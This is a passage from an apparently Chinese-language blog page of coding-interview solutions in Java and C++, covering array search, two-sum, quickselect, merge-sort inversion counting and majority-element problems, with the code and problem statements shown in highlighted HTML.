       <span class="keyword">while</span> (nums[i] != i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] == nums[nums[i]]) &#123;</span><br><span class="line">                duplication[<span class="number">0</span>] = nums[i];</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            swap(nums, i, nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t = nums[i];</span><br><span class="line">    nums[i] = nums[j];</span><br><span class="line">    nums[j] = t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="二维数组的查找">二维数组的查找 √</span></h2><p>在一个二维数组中（每个一维数组的长度相同），每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">Find</span><span class="params">(<span class="keyword">int</span> target, <span class="keyword">int</span> [][] array)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> col=array[<span class="number">0</span>].length-<span class="number">1</span>,row=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(col&gt;=<span class="number">0</span>&amp;&amp;row&lt;=array.length-<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(array[row][col]&lt;target) row++;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(array[row][col]==target) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">else</span> col--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="表示数值的字符串-">表示数值的字符串 -</span></h2><p>请实现一个函数用来判断字符串是否表示数值（包括整数和小数）。例如，字符串”+100”,”5e2”,”-123”,”3.1416”和”-1E-16”都表示数值。 但是”12e”,”1a3.14”,”1.2.3”,”+-5”和”12e+4.3”都不是。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[]  ： 字符集合</span><br><span class="line">()  ： 分组</span><br><span class="line">?   ： 重复 <span class="number">0</span> ~ <span class="number">1</span> 次</span><br><span class="line">+   ： 重复 <span class="number">1</span> ~ n 次</span><br><span class="line">*   ： 重复 <span class="number">0</span> ~ n 次</span><br><span class="line">.   ： 任意字符</span><br><span class="line">\\. ： 转义后的 .</span><br><span class="line">\\d ： 数字</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isNumeric</span><span class="params">(<span class="keyword">char</span>[] str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (str == <span class="keyword">null</span> || str.length == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> String(str).matches(<span class="string">"[+-]?\\d*(\\.\\d+)?([eE][+-]?\\d+)?"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="和为s的两个数字">和为S的两个数字 √</span></h2><p>输入一个递增排序的数组和一个数字S，在数组中查找两个数，使得他们的和正好是S，如果有多对数字的和等于S，输出两个数的乘积最小的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ArrayList&lt;Integer&gt; <span class="title">FindNumbersWithSum</span><span class="params">(<span class="keyword">int</span> [] array,<span class="keyword">int</span> sum)</span> </span>&#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        <span class="keyword">if</span>(array.length==<span class="number">0</span>) <span class="keyword">return</span> res;</span><br><span class="line">        <span class="keyword">int</span> lo=<span class="number">0</span>,hi=array.length-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(hi&gt;lo)&#123;</span><br><span class="line">            <span class="keyword">if</span>(array[lo]+array[hi]==sum)&#123;</span><br><span class="line">                res.add(array[lo]);</span><br><span class="line">                res.add(array[hi]);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(array[lo]+array[hi]&gt;sum) hi--;</span><br><span class="line">            <span class="keyword">else</span> lo++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="和为s的连续正数序列">和为S的连续正数序列 √</span></h2><p>小明很喜欢数学,有一天他在做数学作业时,要求计算出9~16的和,他马上就写出了正确答案是100。但是他并不满足于此,他在想究竟有多少种连续的正数序列的和为100(至少包括两个数)。没多久,他就得到另一组连续正数和为100的序列:18,19,20,21,22。现在把问题交给你,你能不能也很快的找出所有和为S的连续正数序列? Good Luck!</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;ArrayList&lt;Integer&gt; &gt; FindContinuousSequence(<span class="keyword">int</span> sum) &#123;</span><br><span class="line">       <span class="keyword">int</span> lo=<span class="number">1</span>,hi=<span class="number">1</span>;</span><br><span class="line">        ArrayList&lt;ArrayList&lt;Integer&gt; &gt; res = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        <span class="keyword">while</span>(hi&lt;sum&amp;&amp;hi&gt;=lo)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cal(lo,hi)&lt;sum)&#123;</span><br><span class="line">                hi++;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(cal(lo,hi)&gt;sum)&#123;</span><br><span class="line">                lo++;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                res.add(rec(lo,hi));</span><br><span class="line">                hi++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">cal</span><span class="params">(<span class="keyword">int</span> lo, <span class="keyword">int</span> hi)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (lo+hi)*(hi-lo+<span class="number">1</span>)/<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">ArrayList&lt;Integer&gt; <span class="title">rec</span><span class="params">(<span class="keyword">int</span> lo,<span class="keyword">int</span> hi)</span></span>&#123;</span><br><span class="line">         ArrayList&lt;Integer&gt; res=<span class="keyword">new</span> ArrayList();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=lo;i&lt;=hi;i++) res.add(i);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="扑克牌顺子">扑克牌顺子 √</span></h2><p>LL今天心情特别好,因为他去买了一副扑克牌,发现里面居然有2个大王,2个小王(一副牌原本是54张^_^)…他随机从中抽出了5张牌,想测测自己的手气,看看能不能抽到顺子,如果抽到的话,他决定去买体育彩票,嘿嘿！！“红心A,黑桃3,小王,大王,方片5”,“Oh My God!”不是顺子…..LL不高兴了,他想了想,决定大\小 王可以看成任何数字,并且A看作1,J为11,Q为12,K为13。上面的5张牌就可以变成“1,2,3,4,5”(大小王分别看作2和4),“So Lucky!”。LL决定去买体育彩票啦。 现在,要求你使用这幅牌模拟上面的过程,然后告诉我们LL的运气如何， 如果牌能组成顺子就输出true，否则就输出false。为了方便起见,你可以认为大小王是0。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isContinuous</span><span class="params">(<span class="keyword">int</span> [] numbers)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(numbers.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">       Arrays.sort(numbers);</span><br><span class="line">       <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;numbers.length;i++)</span><br><span class="line">           <span class="keyword">if</span>(numbers[i]==<span class="number">0</span>) cnt++;</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i=cnt;i&lt;numbers.length-<span class="number">1</span>;i++)&#123;</span><br><span class="line">           <span class="keyword">if</span>(numbers[i]==numbers[i+<span class="number">1</span>]) <span class="keyword">return</span> <span class="keyword">false</span>;            </span><br><span class="line">           cnt-=numbers[i+<span class="number">1</span>]-numbers[i]-<span class="number">1</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> cnt&gt;=<span class="number">0</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="调整数组顺序使奇数位于偶数前面">调整数组顺序使奇数位于偶数前面 √</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reOrderArray</span><span class="params">(<span class="keyword">int</span> [] array)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">int</span> j=<span class="number">0</span>, i=<span class="number">0</span>;</span><br><span class="line">       <span class="keyword">for</span>(;i&lt;array.length;i++)&#123;</span><br><span class="line">           <span class="keyword">if</span>(array[i]%<span class="number">2</span>==<span class="number">1</span>) j++;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">int</span>[] copy = array.clone();</span><br><span class="line">       i=<span class="number">0</span>;</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> c:copy)&#123;</span><br><span class="line">           <span class="keyword">if</span>(c%<span class="number">2</span>==<span class="number">0</span>) array[j++]=c;</span><br><span class="line">           <span class="keyword">else</span> array[i++]=c;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="数字在排序数组中出现的次数">数字在排序数组中出现的次数 √</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">GetNumberOfK</span><span class="params">(<span class="keyword">int</span> [] array , <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(array.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">int</span> left=BS(array,k);</span><br><span class="line">      <span class="keyword">if</span>(array[left]!=k) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">int</span> right=BS(array,k+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> array[right]==k?right-left+<span class="number">1</span>:right-left;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">BS</span><span class="params">(<span class="keyword">int</span>[] a,<span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> lo=<span class="number">0</span>,hi=a.length-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(lo&lt;hi)&#123;</span><br><span class="line">            <span class="keyword">int</span> mid=lo+(hi-lo)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(a[mid]&lt;k)lo=mid+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> hi=mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> lo;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="最小的k个数-">最小的k个数 -√</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ArrayList&lt;Integer&gt; <span class="title">GetLeastNumbers_Solution</span><span class="params">(<span class="keyword">int</span> [] input, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">         ArrayList&lt;Integer&gt; res=<span class="keyword">new</span> ArrayList();</span><br><span class="line">        <span class="keyword">if</span>(input==<span class="keyword">null</span>||input.length==<span class="number">0</span>||k&lt;=<span class="number">0</span>||k&gt;input.length) <span class="keyword">return</span> res;</span><br><span class="line">        qs(input,k-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;k;i++) res.add(input[i]);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">qs</span><span class="params">(<span class="keyword">int</span>[] a,<span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> lo=<span class="number">0</span>,hi=a.length-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(lo&lt;hi)&#123;</span><br><span class="line">            <span class="keyword">int</span> mid = judge(a,lo,hi);</span><br><span class="line">            <span class="keyword">if</span>(mid==k) <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(mid&lt;k)lo=mid+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> hi=mid-<span class="number">1</span>;</span><br><span class="line">        &#125;        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">judge</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> lo,<span class="keyword">int</span> hi)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i=lo,j=hi,x=a[lo];        </span><br><span class="line">        <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">            <span class="keyword">while</span>(i&lt;j&amp;&amp;a[j]&gt;=x)j--;</span><br><span class="line">            <span class="keyword">if</span>(i&lt;j) a[i]=a[j];</span><br><span class="line">            <span class="keyword">while</span>(i&lt;j&amp;&amp;a[i]&lt;x)i++;</span><br><span class="line">            <span class="keyword">if</span>(i&lt;j) a[j]=a[i];</span><br><span class="line">        &#125;</span><br><span class="line">        a[i]=x;</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">GetLeastNumbers_Solution</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; input, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (k &gt; input.<span class="built_in">size</span>()||k&lt;<span class="number">0</span>) <span class="keyword">return</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;();</span><br><span class="line">        <span class="keyword">return</span> qs(input, k - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">qs</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;input, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> lo = <span class="number">0</span>, hi = input.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (lo &lt; hi) &#123;</span><br><span class="line">            <span class="keyword">int</span> mid = select(input, lo, hi);</span><br><span class="line">            <span class="keyword">if</span> (k == mid) <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (input[mid] &gt; k)hi = mid - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> lo = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>  <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;(<span class="built_in">begin</span>(input), <span class="built_in">begin</span>(input)+k+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">select</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; a, <span class="keyword">int</span> lo, <span class="keyword">int</span> hi)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = lo, j = hi, x = a[lo];</span><br><span class="line">        <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; j &amp;&amp; x &lt;= a[j])j--;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; j)a[i] = a[j];</span><br><span class="line">            <span class="keyword">while</span> (i &lt; j &amp;&amp; x &gt; a[i])i++;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; j)a[j] = a[i];</span><br><span class="line">        &#125;</span><br><span class="line">        a[i] = x;</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Solution s;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; A&#123; <span class="number">7</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">6</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i:s.GetLeastNumbers_Solution(A,<span class="number">6</span>))</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; i &lt;&lt;<span class="string">","</span>;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="数组中的逆序对-">数组中的逆序对 -</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">long</span> cnt;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">InversePairs</span><span class="params">(<span class="keyword">int</span>[] array)</span> </span>&#123;</span><br><span class="line">        cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (array == <span class="keyword">null</span>||array.length==<span class="number">0</span>) <span class="keyword">return</span>  <span class="number">0</span>;</span><br><span class="line">        mergeSort(array, <span class="number">0</span>, array.length - <span class="number">1</span>,<span class="keyword">new</span> <span class="keyword">int</span>[array.length]);</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>)(cnt%<span class="number">1000000007</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 归并排序(从上往下)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">mergeSort</span><span class="params">(<span class="keyword">int</span>[] a, <span class="keyword">int</span> start, <span class="keyword">int</span> end,<span class="keyword">int</span>[] tmp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (start &gt;= end)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">int</span> mid = (start + end) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        mergeSort(a, start, mid,tmp);</span><br><span class="line">        mergeSort(a, mid + <span class="number">1</span>, end,tmp);</span><br><span class="line">        merge(a, start, mid, end,tmp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 将一个数组中的两个相邻有序区间合并成一个</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span>[] a, <span class="keyword">int</span> start, <span class="keyword">int</span> mid, <span class="keyword">int</span> end,<span class="keyword">int</span>[] tmp)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> i = start, j = mid + <span class="number">1</span>, k = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= end) &#123;</span><br><span class="line">            <span class="keyword">if</span> (a[i] &lt;= a[j])</span><br><span class="line">                tmp[k++] = a[i++];</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                tmp[k++] = a[j++];</span><br><span class="line">                cnt += mid - i + <span class="number">1</span>;  <span class="comment">// core code, calculate InversePairs............</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (i &lt;= mid)</span><br><span class="line">            tmp[k++] = a[i++];</span><br><span class="line">        <span class="keyword">while</span> (j &lt;= end)</span><br><span class="line">            tmp[k++] = a[j++];</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;k; i++)</span><br><span class="line">            a[start + i] = tmp[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="数组中出现次数超过一半的数字">数组中出现次数超过一半的数字 ×</span></h2><p>数组中有一个数字出现的次数超过数组长度的一半，请找出这个数字。例如输入一个长度为9的数组{1,2,3,2,2,2,5,4,2}。由于数字2在数组中出现了5次，超过数组长度的一半，因此输出2。如果不存在则输出0。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">MoreThanHalfNum_Solution</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> majority = nums[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>, cnt = <span class="number">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        cnt = nums[i] == majority ? cnt + <span class="number">1</span> : cnt - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (cnt == <span class="number">0</span>) &#123;</span><br><span class="line">            majority = nums[i];</span><br><span class="line">            cnt = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> val : nums)</span><br><span class="line">        <span class="keyword">if</span> (val == majority)</span><br><span class="line">            cnt++;</span><br><span class="line">    <span class="keyword">return</span> cnt &gt; nums.length / <span class="number">2</span> ? majority : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="顺时针打印矩阵">顺时针打印矩阵 ×</span></h2><p>输入一个矩阵，按照从外向里以顺时针的顺序依次打印出每一个数字，例如，如果输入如下4 X 4矩阵： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 则依次打印出数字1,2,3,4,8,12,16,15,14,13,9,5,6,7,11,10.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ArrayList&lt;Integer&gt; 